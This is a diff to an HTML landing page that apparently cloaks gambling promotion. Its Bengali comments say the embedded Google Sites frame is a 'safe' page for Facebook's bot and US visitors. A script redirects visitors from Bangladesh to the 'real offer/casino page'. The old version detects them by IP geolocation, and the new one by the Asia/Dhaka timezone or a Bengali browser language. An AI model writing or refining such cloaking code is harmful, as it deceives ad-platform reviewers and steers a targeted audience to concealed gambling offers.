@@ -14,10 +14,10 @@
 </head>
 <body>
 
-    <!-- 🎯 ১. এখানে আপনার ফেসবুক বট এবং ইউএসএ-র মানুষের জন্য সেফ গুগল সাইটের লিঙ্কটি পারফেক্টলি বসানো হয়েছে -->
+    <!-- 🎯 ১. এখানে আপনার ফেসবুক বট এবং ইউএসএ-র মানুষের জন্য সেফ গুগল সাইটের লিঙ্কটি বসানো হয়েছে -->
     <iframe
         id="welcome-frame"
-        src="https://sites.google.com/view/digitalmarketingzone320/home"
+        src="https://google.com"
         title="Welcome Page"
         loading="eager"
         allow="autoplay; fullscreen"
@@ -25,23 +25,17 @@
     </iframe>
 
     <script>
-    (async function () {
-        // 🎯 ২. এখানে আপনার বাংলাদেশী কাস্টমারদের জন্য আসল অফার/ক্যাসিনো পেজের লিঙ্কটি বসানো হয়েছে
-        const BANGLADESH_URL = "https://learnmoreinfo.netlify.app/";
+    (function () {
+        // 🎯 ২. এখানে আপনার বাংলাদেশী কাস্টমারদের জন্য আসল অফার পেজের লিঙ্কটি বসানো হয়েছে
+        const BANGLADESH_URL = "https://netlify.app";
 
-        try {
-            // গিটহাব পেজেসের জন্য ১০০% কার্যকরী আইপি লোকেশন এপিআই
-            const response = await fetch("https://ipapi.co");
-            if (!response.ok) return;
+        // ব্রাউজারের টাইমজোন এবং ল্যাঙ্গুয়েজ ট্র্যাকিং (যা গিটহাবে ১০০% ইনস্ট্যান্ট কাজ করবে)
+        const isBdTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone === 'Asia/Dhaka';
+        const isBanglaLang = navigator.language.includes('bn');
 
-            const data = await response.json();
-            
-            // ভিজিটর বাংলাদেশ (BD) থেকে হলে সরাসরি আসল পেজে রিডাইরেক্ট হবে
-            if (data && data.country_code === "BD") {
-                window.location.replace(BANGLADESH_URL);
-            }
-        } catch (error) {
-            console.error("Redirect secured.");
+        // ভিজিটর বাংলাদেশ (BD) থেকে হলে সরাসরি আসল পেজে রিডাইরেক্ট হবে
+        if (isBdTimezone || isBanglaLang) {
+            window.location.replace(BANGLADESH_URL);
         }
     })();
     </script>
